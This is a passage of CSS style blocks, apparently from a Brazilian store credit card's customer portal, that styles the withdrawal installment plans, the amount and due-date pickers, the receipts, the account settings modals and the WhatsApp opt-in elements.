         display: none; }
         .parcelamento-saque__content .parcelamento-saque__label {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: start;
         justify-content: flex-start; }
         .parcelamento-saque__content .parcelamento-saque__label::before {
         position: absolute;
         left: 25px;
         border: solid 1px #acacac;
         border-radius: 50%;
         width: 20px;
         height: 20px;
         vertical-align: bottom;
         content: ''; }
         .parcelamento-saque__content .parcelamento-saque__label--selected::before {
         box-shadow: inset 0 0 0 3px #fff; }
         .cartao-renner .parcelamento-saque__content .parcelamento-saque__label--selected::before {
         border-color: #d71920;
         background-color: #d71920; }
         .meu-cartao .parcelamento-saque__content .parcelamento-saque__label--selected::before {
         border-color: #ac8947;
         background-color: #ac8947; }
         .parcelamento-saque__content .parcelamento-saque__plano {
         display: -webkit-box;
         display: flex;
         width: 100%;
         font-size: 14px; }
         .parcelamento-saque__content .parcelamento-saque__plano:not(.ativo) {
         border-color: #e0e0e0; }
         .parcelamento-saque__content .parcelamento-saque__plano__main-text {
         font-weight: bold; }
         .parcelamento-saque__content .collapsible-arrow__button {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .parcelamento-saque__content .collapsible-arrow__button .collapsible-arrow__text {
         margin-top: 15px;
         font-weight: 400; }
         .parcelamento-saque__content .collapsible-arrow__button .collapsible-arrow {
         display: inline-block;
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg);
         -webkit-transition: 0.25s;
         transition: 0.25s;
         outline: none;
         border-width: 0 2px 2px 0;
         border-style: solid;
         cursor: pointer;
         padding: 6px; }
         .cartao-renner .parcelamento-saque__content .collapsible-arrow__button .collapsible-arrow {
         border-color: #d71920; }
         .meu-cartao .parcelamento-saque__content .collapsible-arrow__button .collapsible-arrow {
         border-color: #ac8947; }
         .parcelamento-saque__content .collapsible--collapsed .collapsible-arrow {
         -webkit-transform: rotate(-135deg);
         transform: rotate(-135deg); }
         @media (max-width: 767px) {
         .parcelamento-saque__content .parcelamento-saque {
         width: 100%; }
         .parcelamento-saque__content .parcelamento-saque__label {
         margin: 5px; }
         .parcelamento-saque__content .parcelamento-saque:first-child {
         border-top: 1px solid #e0e0e0; }
         .parcelamento-saque__content .parcelamento-saque__plano {
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         border-bottom: 1px solid #e0e0e0;
         cursor: pointer;
         padding: 5px;
         width: 100%; }
         .parcelamento-saque__content .parcelamento-saque__plano__main-text {
         margin-bottom: 5px;
         padding-left: 30px;
         font-size: 14px; }
         .parcelamento-saque__content .parcelamento-saque__plano__secondary-text {
         margin: 0;
         font-size: 12px; }
         .parcelamento-saque__content .parcelamento-saque__plano__detalhes-parcelamento {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: end;
         align-items: flex-end;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .parcelamento-saque__content .collapsible-arrow__text {
         font-size: 12px; } }
         @media (min-width: 768px) {
         .parcelamento-saque__content .parcelamento-saque {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap;
         -webkit-box-pack: start;
         justify-content: flex-start;
         width: 100%; }
         .parcelamento-saque__content .parcelamento-saque__label {
         position: relative;
         margin: 5px;
         width: 47%; }
         .parcelamento-saque__content .parcelamento-saque__label::before {
         left: 8px;
         width: 22px;
         height: 22px; }
         .cartao-renner .parcelamento-saque__content .parcelamento-saque__label--selected {
         border-color: #d71920; }
         .meu-cartao .parcelamento-saque__content .parcelamento-saque__label--selected {
         border-color: #ac8947; }
         .parcelamento-saque__content .parcelamento-saque__label--selected::before {
         box-shadow: inset 0 0 0 4px #fff; }
         .parcelamento-saque__content .parcelamento-saque__plano {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         border-width: 1px;
         border-style: solid;
         box-shadow: 2px 5px 5px #e0e0e0;
         cursor: pointer;
         padding: 12px 0px 12px 40px; }
         .parcelamento-saque__content .parcelamento-saque__plano.ativo {
         border-width: 2px; }
         .cartao-renner .parcelamento-saque__content .parcelamento-saque__plano.ativo {
         border-color: #d71920; }
         .meu-cartao .parcelamento-saque__content .parcelamento-saque__plano.ativo {
         border-color: #ac8947; }
         .parcelamento-saque__content .parcelamento-saque__plano__main-text {
         margin-bottom: 5px;
         font-size: 16px; }
         .parcelamento-saque__content .parcelamento-saque__plano__secondary-text {
         margin: 0;
         font-size: 13px; }
         .parcelamento-saque__content .parcelamento-saque__plano .text-ultima-parcela {
         font-size: 12px; }
         .parcelamento-saque__content .collapsible-arrow__text {
         font-size: 13px; } }
         @media (min-width: 1024px) {
         .parcelamento-saque__content .parcelamento-saque__label {
         margin: 10px;
         width: 30%; }
         .parcelamento-saque__content .parcelamento-saque__label::before {
         left: 10px;
         width: 25px;
         height: 25px; }
         .parcelamento-saque__content .parcelamento-saque__plano {
         padding-left: 45px; } }
      </style>
      <style type="text/css">.cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .bg-themed {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed, .cartao-renner .valor-saque .block__opcoes .ativo, .valor-saque .block__opcoes .cartao-renner .ativo,
         .meu-cartao .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .valor-saque .block__opcoes .ativo,
         .valor-saque .block__opcoes .meu-cartao .cartao-renner .ativo {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed, .cartao-renner .valor-saque .block__opcoes .ativo, .valor-saque .block__opcoes .cartao-renner .ativo,
         .meu-cartao .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .valor-saque .block__opcoes .ativo,
         .valor-saque .block__opcoes .meu-cartao .cartao-renner .ativo {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed, .cartao-renner.theme-priority .valor-saque .block__opcoes .ativo, .valor-saque .block__opcoes .cartao-renner.theme-priority .ativo {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed, .cartao-renner.theme-priority .valor-saque .block__opcoes .ativo, .valor-saque .block__opcoes .cartao-renner.theme-priority .ativo {
         color: #ac8947; }
         .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .bg-themed {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed, .meu-cartao .valor-saque .block__opcoes .ativo, .valor-saque .block__opcoes .meu-cartao .ativo,
         .cartao-renner .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .valor-saque .block__opcoes .ativo,
         .valor-saque .block__opcoes .cartao-renner .meu-cartao .ativo {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed, .meu-cartao .valor-saque .block__opcoes .ativo, .valor-saque .block__opcoes .meu-cartao .ativo,
         .cartao-renner .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .valor-saque .block__opcoes .ativo,
         .valor-saque .block__opcoes .cartao-renner .meu-cartao .ativo {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed, .meu-cartao.theme-priority .valor-saque .block__opcoes .ativo, .valor-saque .block__opcoes .meu-cartao.theme-priority .ativo {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed, .meu-cartao.theme-priority .valor-saque .block__opcoes .ativo, .valor-saque .block__opcoes .meu-cartao.theme-priority .ativo {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         .valor-saque .textfield__input {
         padding-bottom: 3px;
         color: #1e1e1f; }
         .valor-saque .textfield__input ~ .textfield__icon {
         color: #1e1e1f; }
         .valor-saque .textfield__icon {
         top: 18px; }
         .valor-saque .textfield__icon svg {
         stroke: #1e1e1f; }
         .valor-saque .textfield__input.ng-validate.ng-dirty.ng-invalid ~ .textfield__icon svg {
         stroke: #cf3e3e; }
         .valor-saque .textfield-valor {
         margin-bottom: 30px;
         width: 320px; }
         .valor-saque .textfield-valor label {
         text-transform: none;
         font-size: 13px; }
         .valor-saque .block__opcoes {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap;
         -webkit-box-pack: start;
         justify-content: flex-start; }
         .valor-saque .block__opcoes .valor-saque__label {
         margin: 7.5px; }
         .valor-saque .block__opcoes .valor-saque__radio {
         display: none; }
         .valor-saque .block__opcoes .ativo {
         font-weight: 700; }
         .valor-saque .block__opcoes .valor-botao {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         border-width: 1px;
         border-style: solid;
         border-radius: 10px;
         cursor: pointer;
         height: 50px;
         font-size: 14px; }
         .valor-saque .block__opcoes .valor-botao:not(.ativo) {
         border-color: #e0e0e0; }
         @media (max-width: 767px) {
         .valor-saque__label {
         width: 45%; } }
         @media (max-width: 359px) {
         .valor-saque .textfield-valor label {
         font-size: 12px; }
         .valor-saque .block__opcoes .valor-saque__label {
         margin: 5px; } }
         @media (min-width: 768px) {
         .valor-saque__label {
         width: 46%; } }
         @media (min-width: 1024px) {
         .valor-saque__label {
         width: 23%; } }
      </style>
      <style type="text/css">.cartao-renner .bg-themed,
         .meu-cartao .cartao-renner .bg-themed {
         background-color: #d71920; }
         .cartao-renner .bg-themed--selected {
         background-color: #810f13; }
         .cartao-renner .border-themed, .cartao-renner .vencimento-saque .block__opcoes .ativo, .vencimento-saque .block__opcoes .cartao-renner .ativo,
         .meu-cartao .cartao-renner .border-themed,
         .meu-cartao .cartao-renner .vencimento-saque .block__opcoes .ativo,
         .vencimento-saque .block__opcoes .meu-cartao .cartao-renner .ativo {
         border-color: #d71920; }
         .cartao-renner .border-themed--selected {
         border-color: #810f13; }
         .cartao-renner .text-themed, .cartao-renner .vencimento-saque .block__opcoes .ativo, .vencimento-saque .block__opcoes .cartao-renner .ativo,
         .meu-cartao .cartao-renner .text-themed,
         .meu-cartao .cartao-renner .vencimento-saque .block__opcoes .ativo,
         .vencimento-saque .block__opcoes .meu-cartao .cartao-renner .ativo {
         color: #d71920; }
         .cartao-renner .text-themed--selected {
         color: #810f13; }
         .cartao-renner.theme-priority .bg-themed {
         background-color: #ac8947; }
         .cartao-renner.theme-priority .border-themed, .cartao-renner.theme-priority .vencimento-saque .block__opcoes .ativo, .vencimento-saque .block__opcoes .cartao-renner.theme-priority .ativo {
         border-color: #ac8947; }
         .cartao-renner.theme-priority .text-themed, .cartao-renner.theme-priority .vencimento-saque .block__opcoes .ativo, .vencimento-saque .block__opcoes .cartao-renner.theme-priority .ativo {
         color: #ac8947; }
         .meu-cartao .bg-themed,
         .cartao-renner .meu-cartao .bg-themed {
         background-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         border-color: #997a3f; }
         .meu-cartao .border-themed, .meu-cartao .vencimento-saque .block__opcoes .ativo, .vencimento-saque .block__opcoes .meu-cartao .ativo,
         .cartao-renner .meu-cartao .border-themed,
         .cartao-renner .meu-cartao .vencimento-saque .block__opcoes .ativo,
         .vencimento-saque .block__opcoes .cartao-renner .meu-cartao .ativo {
         border-color: #ac8947; }
         .meu-cartao .bg-themed--selected {
         background-color: #997a3f; }
         .meu-cartao .text-themed, .meu-cartao .vencimento-saque .block__opcoes .ativo, .vencimento-saque .block__opcoes .meu-cartao .ativo,
         .cartao-renner .meu-cartao .text-themed,
         .cartao-renner .meu-cartao .vencimento-saque .block__opcoes .ativo,
         .vencimento-saque .block__opcoes .cartao-renner .meu-cartao .ativo {
         color: #ac8947; }
         .meu-cartao .text-themed--selected {
         color: #997a3f; }
         .meu-cartao.theme-priority .bg-themed {
         background-color: #ac8947; }
         .meu-cartao.theme-priority .border-themed, .meu-cartao.theme-priority .vencimento-saque .block__opcoes .ativo, .vencimento-saque .block__opcoes .meu-cartao.theme-priority .ativo {
         border-color: #ac8947; }
         .meu-cartao.theme-priority .text-themed, .meu-cartao.theme-priority .vencimento-saque .block__opcoes .ativo, .vencimento-saque .block__opcoes .meu-cartao.theme-priority .ativo {
         color: #ac8947; }
         .cartao-renner .hidden-for-cartao-renner {
         display: none; }
         .meu-cartao .hidden-for-meu-cartao {
         display: none; }
         .vencimento-saque .block__opcoes {
         display: -webkit-box;
         display: flex;
         flex-wrap: wrap;
         -webkit-box-pack: start;
         justify-content: flex-start;
         width: auto; }
         .vencimento-saque .block__opcoes .vencimento-saque__label {
         margin: 7.5px; }
         .vencimento-saque .block__opcoes .vencimento-saque__radio {
         display: none; }
         .vencimento-saque .block__opcoes .ativo {
         font-weight: 700; }
         .vencimento-saque .block__opcoes .valor-botao {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: center;
         justify-content: center;
         border-width: 1px;
         border-style: solid;
         border-radius: 10px;
         cursor: pointer;
         height: 50px;
         font-size: 14px; }
         .vencimento-saque .block__opcoes .valor-botao:not(.ativo) {
         border-color: #e0e0e0; }
         @media (max-width: 767px) {
         .vencimento-saque .vencimento-saque__label {
         width: 44%; } }
         @media (min-width: 768px) {
         .vencimento-saque .vencimento-saque__label {
         width: 46%; } }
         @media (min-width: 1024px) {
         .vencimento-saque .vencimento-saque__label {
         width: 23%; } }
      </style>
      <style type="text/css">.simulacao-saque__header-title {
         padding: 5px 10px;
         font-size: 24px;
         font-weight: 300; }
         .simulacao-saque .tab-header-item a {
         height: 70px; }
         .simulacao-saque__etapa {
         min-height: 200px; }
         @media (max-width: 767px) {
         .simulacao-saque__header-title {
         padding: 5px 10px;
         font-size: 20px;
         font-weight: 300; }
         .simulacao-saque__paginacao {
         display: -webkit-box;
         display: flex;
         position: absolute;
         top: 200px;
         right: 0;
         left: 0;
         -webkit-box-align: center;
         align-items: center;
         color: #706f6f; }
         .simulacao-saque__paginacao .paginacao__button {
         position: absolute;
         cursor: pointer;
         width: 25px; }
         .simulacao-saque__paginacao .paginacao__button:disabled {
         cursor: inherit;
         color: #acacac; }
         .simulacao-saque__paginacao .paginacao__button:focus {
         outline: none; }
         .simulacao-saque__paginacao .button-forth {
         right: 45px; }
         .simulacao-saque__paginacao .button-back {
         left: 45px; }
         .simulacao-saque .etapa-simulacao__section {
         margin: 10px; }
         .simulacao-saque .tab-header-item--disabled {
         display: none; }
         .simulacao-saque__confirmar-etapa__button {
         margin: 40px 10px 10px; }
         .simulacao-saque__etapa {
         padding: 10px; } }
         @media (min-width: 768px) {
         .simulacao-saque__header-title {
         margin-top: 0;
         margin-bottom: 15px;
         padding: 5px 10px;
         font-size: 24px;
         font-weight: 300; }
         .simulacao-saque__confirmar-etapa__button {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .simulacao-saque__confirmar-etapa__button button {
         width: 140px; }
         .simulacao-saque__voltar-etapa__button {
         display: -webkit-box;
         display: flex;
         -webkit-box-pack: start;
         justify-content: flex-start; }
         .simulacao-saque__voltar-etapa__button button {
         width: 140px; }
         .simulacao-saque__navegacao {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between;
         margin: 40px 25px 10px; }
         .simulacao-saque .teste {
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .simulacao-saque__etapa {
         padding: 25px; } }
         @media (min-width: 1200px) {
         .simulacao-saque__navegacao {
         margin: 40px 45px 10px; }
         .simulacao-saque__etapa {
         padding: 40px; } }
      </style>
      <style type="text/css">.simulacao-saque__tab-header-item {
         text-transform: none; }
         .simulacao-saque__tab-header-item p {
         margin: 3px; }
         .simulacao-saque__tab-header-item__title {
         font-weight: 700; }
         .simulacao-saque__tab-header-item__subtitle {
         line-height: 20px;
         font-weight: 400; }
         @media (max-width: 767px) {
         .simulacao-saque__tab-header-item__title {
         color: #1e1e1f;
         font-size: 12px; }
         .simulacao-saque__tab-header-item__subtitle {
         color: #1e1e1f;
         font-size: 12px; } }
         @media (min-width: 768px) {
         .simulacao-saque__tab-header-item__title {
         color: #1e1e1f;
         font-size: 16px; }
         .simulacao-saque__tab-header-item__subtitle {
         color: #acacac;
         font-size: 13px; }
         .simulacao-saque__tab-header-item .item__title--inactive,
         .simulacao-saque__tab-header-item .item__subtitle--inactive {
         color: #acacac;
         font-size: 13px; } }
      </style>
      <style type="text/css">.comprovantes .comprovantes__item {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .comprovantes .comprovantes__item__desc {
         margin: 0;
         color: #706f6f;
         font-size: 16px; }
         .comprovantes .comprovantes__item__actions {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .comprovantes .comprovantes__item__input-ano {
         width: 100px; }
         .comprovantes .comprovantes__item__input-ano .select.select-box {
         padding: 0;
         line-height: 33px; }
         .comprovantes .comprovantes__item__input-ano .select.select-box:after {
         top: 35%;
         right: 7px;
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg);
         border: 0;
         border-right: 2px solid #706f6f;
         border-bottom: 2px solid #706f6f;
         border-radius: 2px;
         width: 9px;
         height: 9px; }
         .comprovantes .comprovantes__item__button {
         margin-left: 15px;
         padding: 10px 0; }
         .comprovantes .comprovantes__item__button button,
         .comprovantes .comprovantes__item__button a {
         min-width: 140px; }
         @media (max-width: 767px) {
         .comprovantes .comprovantes__item {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .comprovantes .comprovantes__item__actions {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         width: 100%; }
         .comprovantes .comprovantes__item__desc {
         font-size: 14px; }
         .comprovantes .comprovantes__item__button {
         margin-left: 0;
         padding: 15px 0; }
         .comprovantes .comprovantes__item__button, .comprovantes .comprovantes__item__desc,
         .comprovantes .comprovantes__item__button a,
         .comprovantes .comprovantes__item__button button, .comprovantes .comprovantes__item__input-ano {
         width: 100%; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .safari .comprovantes .comprovantes__item__desc {
         -webkit-box-flex: 1;
         flex: 1; } }
         .meus-ajustes__panel.meus-ajustes__panel-comprovantes .block__header {
         display: -webkit-box;
         display: flex; }
         .meus-ajustes__panel.meus-ajustes__panel-comprovantes .block__header-title {
         -webkit-box-flex: 1;
         flex: 1; }
         .modal-comprovante-sem-lancamentos {
         width: 450px; }
         .modal-comprovante-sem-lancamentos .modal__icon-title {
         margin-bottom: 30px; }
         .modal-comprovante-sem-lancamentos .modal__content {
         margin-bottom: 0; }
         .modal-comprovante-sem-lancamentos .modal__content p {
         margin-bottom: 30px; }
         @media (max-width: 767px) {
         .meus-ajustes__panel.meus-ajustes__panel-comprovantes .block {
         padding: 0; } }
         .modal-confirmar-fatura-email .modal__content {
         color: #706f6f; }
         .icon-common-class, .meus-ajustes .information-edit__item__action__desc--address .simple-icon, .context-meus-ajustes .modal__content__text-icon .simple-icon {
         display: block;
         position: absolute;
         top: 0;
         -webkit-transform: translateY(-7%);
         transform: translateY(-7%);
         padding: 0;
         width: 20px;
         height: 20px; }
         .meus-ajustes .meus-ajustes__header-title {
         margin-bottom: 20px;
         font-size: 22px;
         font-weight: 300; }
         .meus-ajustes .loader__invisibility-cloak {
         min-height: 50px; }
         .meus-ajustes .meus-ajustes__panel {
         padding-bottom: 40px; }
         .meus-ajustes .meus-ajustes__panel .block__header .block__header-text {
         border-bottom: 1px solid #e0e0e0;
         padding: 0 0 10px 10px;
         width: 100%;
         color: #706f6f;
         font-size: 14px; }
         .meus-ajustes .meus-ajustes__panel .block__content {
         padding: 0 10px; }
         .meus-ajustes .meus-ajustes__panel .block__content .block__content--description {
         color: #706f6f;
         font-size: 16px; }
         .meus-ajustes .meus-ajustes__panel-dad {
         padding-bottom: 0; }
         .meus-ajustes .information-edit__item {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         padding-bottom: 15px; }
         .meus-ajustes .information-edit__item__text {
         margin: 0;
         padding: 0;
         color: #706f6f;
         font-size: 16px; }
         .meus-ajustes .information-edit__item:last-child {
         padding-bottom: 0; }
         .meus-ajustes .information-edit__item small {
         color: #acacac;
         font-size: 13px;
         font-weight: normal; }
         .meus-ajustes .information-edit__item__button {
         display: -webkit-box;
         display: flex;
         -webkit-box-flex: 1;
         flex-grow: 1;
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .meus-ajustes .information-edit__item__button .button {
         min-width: 140px; }
         .meus-ajustes .information-edit__item__action {
         display: block; }
         .meus-ajustes .information-edit__item__action__desc {
         display: inline-block;
         position: relative;
         padding-right: 30px;
         vertical-align: top;
         line-height: 16px;
         color: #706f6f;
         font-size: 16px;
         font-weight: normal; }
         .meus-ajustes .information-edit__item__action__desc--address {
         width: 100%;
         line-height: 18px; }
         .meus-ajustes .information-edit__item__action__desc--address .simple-icon {
         right: 0;
         z-index: 1;
         cursor: pointer; }
         .meus-ajustes .information-edit__item__action__desc--address .simple-icon.gray-theme {
         color: #acacac; }
         @media (max-width: 767px) {
         .meus-ajustes .information-edit__item {
         -webkit-box-align: inherit;
         align-items: inherit;
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .meus-ajustes .information-edit__item__button loader,
         .meus-ajustes .information-edit__item__button .button {
         width: 100%; } }
         .context-meus-ajustes .field-box {
         padding-bottom: 8px; }
         .context-meus-ajustes .field-box:last-child {
         padding-bottom: 0; }
         .context-meus-ajustes .modal__content {
         margin-bottom: 0; }
         .context-meus-ajustes .modal__content__icon-center {
         display: block;
         margin: 0 auto;
         width: 60px;
         height: 60px;
         color: #1e1e1f; }
         .context-meus-ajustes .modal__content__icon-center--green {
         color: #3ecf7a; }
         .context-meus-ajustes .modal__content__icon-center--red {
         color: #cf3e3e; }
         .context-meus-ajustes .modal__content__title {
         display: block;
         padding: 20px 10px;
         text-align: center;
         line-height: 26px;
         font-size: 24px;
         font-weight: bold;
         font-style: normal; }
         .context-meus-ajustes .modal__content__title--green {
         color: #3ecf7a; }
         .context-meus-ajustes .modal__content__title--red {
         color: #cf3e3e; }
         .context-meus-ajustes .modal__content__text {
         display: block;
         text-align: center;
         line-height: normal;
         color: #706f6f;
         font-size: 16px; }
         .context-meus-ajustes .modal__content__text-icon {
         display: inline-block;
         position: relative;
         padding-top: 10px;
         padding-bottom: 10px; }
         .context-meus-ajustes .modal__content__text-icon .simple-icon {
         top: 50%;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%); }
         .context-meus-ajustes .modal__content__text-icon--left {
         padding-left: 30px; }
         .context-meus-ajustes .modal__content__text-icon--left .simple-icon {
         left: 0; }
         .context-meus-ajustes .modal__content__text-icon--right {
         padding-right: 30px; }
         .context-meus-ajustes .modal__content__text-icon--right .simple-icon {
         right: 0; }
         @media (min-width: 768px) {
         .context-meus-ajustes .modal--medium {
         width: 450px; } }
         .input-icon--password .input-icon__input {
         padding-right: 40px; }
         .input-icon__icon__toggle--hide {
         display: inherit; }
         .input-icon__icon__toggle--show {
         display: none; }
         .input-icon__icon--password {
         right: 10px;
         left: inherit;
         cursor: pointer;
         width: 20px;
         height: 20px; }
         .meus-ajustes .tooltip p {
         margin: 0; }
         .meus-ajustes__left-panel {
         z-index: 1; }
         .hide-field-error .field-message {
         visibility: hidden !important; }
      </style>
      <style type="text/css">.comprovantes .comprovantes__item {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .comprovantes .comprovantes__item__desc {
         margin: 0;
         color: #706f6f;
         font-size: 16px; }
         .comprovantes .comprovantes__item__actions {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center; }
         .comprovantes .comprovantes__item__input-ano {
         width: 100px; }
         .comprovantes .comprovantes__item__input-ano .select.select-box {
         padding: 0;
         line-height: 33px; }
         .comprovantes .comprovantes__item__input-ano .select.select-box:after {
         top: 35%;
         right: 7px;
         -webkit-transform: rotate(45deg);
         transform: rotate(45deg);
         border: 0;
         border-right: 2px solid #706f6f;
         border-bottom: 2px solid #706f6f;
         border-radius: 2px;
         width: 9px;
         height: 9px; }
         .comprovantes .comprovantes__item__button {
         margin-left: 15px;
         padding: 10px 0; }
         .comprovantes .comprovantes__item__button button,
         .comprovantes .comprovantes__item__button a {
         min-width: 140px; }
         @media (max-width: 767px) {
         .comprovantes .comprovantes__item {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .comprovantes .comprovantes__item__actions {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         width: 100%; }
         .comprovantes .comprovantes__item__desc {
         font-size: 14px; }
         .comprovantes .comprovantes__item__button {
         margin-left: 0;
         padding: 15px 0; }
         .comprovantes .comprovantes__item__button, .comprovantes .comprovantes__item__desc,
         .comprovantes .comprovantes__item__button a,
         .comprovantes .comprovantes__item__button button, .comprovantes .comprovantes__item__input-ano {
         width: 100%; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .safari .comprovantes .comprovantes__item__desc {
         -webkit-box-flex: 1;
         flex: 1; } }
         .meus-ajustes__panel.meus-ajustes__panel-comprovantes .block__header {
         display: -webkit-box;
         display: flex; }
         .meus-ajustes__panel.meus-ajustes__panel-comprovantes .block__header-title {
         -webkit-box-flex: 1;
         flex: 1; }
         .modal-comprovante-sem-lancamentos {
         width: 450px; }
         .modal-comprovante-sem-lancamentos .modal__icon-title {
         margin-bottom: 30px; }
         .modal-comprovante-sem-lancamentos .modal__content {
         margin-bottom: 0; }
         .modal-comprovante-sem-lancamentos .modal__content p {
         margin-bottom: 30px; }
         @media (max-width: 767px) {
         .meus-ajustes__panel.meus-ajustes__panel-comprovantes .block {
         padding: 0; } }
      </style>
      <style type="text/css">.duvidas-frequetes-acesso__title {
         margin-bottom: 10px;
         color: #706f6f; }
      </style>
      <style type="text/css">.modal-confirmar-fatura-email .modal__content {
         color: #706f6f; }
      </style>
      <style type="text/css">.whatsapp-optin__actions {
         display: -webkit-box;
         display: flex;
         margin-top: 26px; }
         .whatsapp-optin__actions > * {
         -webkit-box-flex: 1;
         flex: 1;
         margin-right: 20px;
         width: 100%; }
         .whatsapp-optin__actions > *:last-child {
         margin-right: 0; }
         .whatsapp-optin__actions .button {
         padding: 0;
         width: 100%; }
         @media (max-width: 767px) {
         .whatsapp-optin__actions {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         margin-right: 0; }
         .whatsapp-optin__actions button {
         margin-bottom: 10px; } }
         .ativar-optin__contrato {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin-bottom: 16px; }
         .ativar-optin__underline-text {
         text-decoration: underline;
         white-space: nowrap; }
         .ativar-optin__icon {
         display: inline-block;
         margin-bottom: -2px;
         width: 18px;
         height: 18px; }
         .ativar-optin__input--telefone {
         width: 55%; }
         @media (max-width: 767px) {
         .ativar-optin__input--telefone {
         width: 100%; } }
      </style>
      <style type="text/css">.whatsapp-optin__actions {
         display: -webkit-box;
         display: flex;
         margin-top: 26px; }
         .whatsapp-optin__actions > * {
         -webkit-box-flex: 1;
         flex: 1;
         margin-right: 20px;
         width: 100%; }
         .whatsapp-optin__actions > *:last-child {
         margin-right: 0; }
         .whatsapp-optin__actions .button {
         padding: 0;
         width: 100%; }
         @media (max-width: 767px) {
         .whatsapp-optin__actions {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column;
         margin-right: 0; }
         .whatsapp-optin__actions button {
         margin-bottom: 10px; } }
      </style>
      <style type="text/css">.onboarding-button {
         display: -webkit-box;
         display: flex;
         -webkit-box-align: center;
         align-items: center;
         margin: 30px 0 0;
         cursor: pointer;
         width: 170px;
         -webkit-user-select: none;
         -moz-user-select: none;
         -ms-user-select: none;
         user-select: none; }
         .onboarding-button .text {
         margin: 0 0 0 13px;
         text-transform: uppercase;
         color: #1e1e1f;
         font-size: 14px;
         font-weight: 500; }
         .onboarding-button__tooltip {
         position: absolute;
         bottom: 40px;
         z-index: 1;
         border: 1px solid #acacac;
         border-radius: 7px;
         box-shadow: 0 0 5px 0 rgba(0, 0, 0, 0.3);
         background: white;
         padding: 11px;
         width: 305px;
         height: 85px; }
         .onboarding-button__tooltip .tooltip-text {
         line-height: 15px;
         font-size: 12px; }
         .onboarding-button__tooltip .button {
         position: absolute;
         right: 11px;
         bottom: 11px;
         width: 100px;
         height: 30px;
         line-height: 0;
         font-size: 14px; }
         .onboarding-button__tooltip:after, .onboarding-button__tooltip:before {
         position: absolute;
         left: 15px;
         -webkit-transform: translateX(-50%);
         transform: translateX(-50%);
         width: 0;
         height: 0;
         content: ""; }
         .onboarding-button__tooltip:before {
         bottom: -8px;
         z-index: 2;
         border-top: 8px solid white;
         border-right: 8px solid transparent;
         border-left: 8px solid transparent; }
         .onboarding-button__tooltip:after {
         bottom: -9px;
         z-index: 1;
         border-top: 9px solid rgba(0, 0, 0, 0.3);
         border-right: 9px solid transparent;
         border-left: 9px solid transparent; }
         .onboarding-button .icon svg {
         width: 30px;
         height: 30px; }
         @media (max-width: 767px) {
         .onboarding-button--holder {
         position: fixed;
         bottom: 61px;
         left: 11px;
         z-index: -1; }
         .onboarding-button {
         margin: 0;
         width: 30px; }
         .onboarding-button .text {
         display: none; }
         .onboarding-button .icon svg {
         width: 30px;
         height: 30px; } }
